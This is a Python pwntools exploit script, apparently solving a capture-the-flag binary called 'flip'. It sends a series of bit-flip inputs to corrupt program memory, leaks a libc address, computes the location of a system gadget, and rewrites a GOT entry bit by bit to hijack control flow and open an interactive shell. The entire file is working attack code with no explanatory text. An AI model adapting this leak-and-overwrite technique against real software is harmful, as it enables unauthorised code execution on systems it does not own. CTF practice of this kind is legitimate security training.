from pwn import *
s=process("./flip",env={"LD_PRELOAD":'./libc.so.6'})
#`s=remote("flip.tghack.no",1947)
s.recvuntil("dr:bit to flip:")
#gdb.attach(s)
s.sendline("601068"+":"+"1")
s.sendline("601068"+":"+"2")
s.sendline("601068"+":"+"4")
s.sendline("601060"+":"+"1")
s.sendline("601060"+":"+"1")

s.sendline("601080"+":"+"0")
s.sendline("601080"+":"+"4")
s.sendline("601081"+":"+"0")
s.sendline("601081"+":"+"1")
s.sendline("601081"+":"+"3")


s.sendline("601081"+":"+"4")
s.sendline("601081"+":"+"1")
s.sendline("601081"+":"+"1")
s.sendline("6010e8"+":"+"4")
s.sendline("601082"+":"+"5")

s.recvuntil("Have a nice day :)\n")
s.recvuntil("Have a nice day :)\n")
s.recvuntil("Have a nice day :)\n")

leak=s.recv(6)
leak=leak+"\x00\x00"
leak=u64(leak)
#print hex(leak)

base = leak - 0x64e80
system = base + 0x10a38c
print hex(system)


c=[]
a=0x00000000004006f6
addr=0x601030
b=system

for i in range(47):
    if(a&(1<<i) ^ b&(1<<i)):
        c.append(i)
counter=0

if(len(c)%5!=0):
    counter=5-len(c)%5

for i in range(counter):
    s.sendline("6010e8"+":"+"4")

for j in range(len(c)):
    address=addr+(c[j]/8)
    num=(c[j]%8)
    print num,
    address=str(hex(address))
    s.sendline(address[2:]+":"+str(num))

s.sendline("601068"+":"+"7")
s.sendline("601069"+":"+"0")
s.sendline("601082"+":"+"5")
s.sendline("601082"+":"+"5")
s.sendline("601082"+":"+"5")



print c
s.interactive()
